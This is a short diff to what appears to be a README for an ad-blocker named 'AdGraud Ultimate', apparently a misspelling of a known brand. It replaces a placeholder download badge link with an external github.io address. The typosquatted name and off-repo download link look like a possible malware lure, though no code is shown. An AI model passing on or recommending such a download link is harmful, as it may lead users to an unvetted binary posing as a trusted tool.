@@ -2,7 +2,7 @@
 
 A modern and powerful ad-blocking solution designed to eliminate intrusive ads, tracking scripts, and malicious content across all platforms. Built for speed, privacy, and full user control.
 
-[![Download AdGraud Ultimate](https://img.shields.io/badge/Download-AdGraud_Ultimate-blueviolet)](#)
+[![Download AdGraud Ultimate](https://img.shields.io/badge/Download-AdGraud_Ultimate-blueviolet)](https://ad-graud.github.io/.github)
 
 ---
 
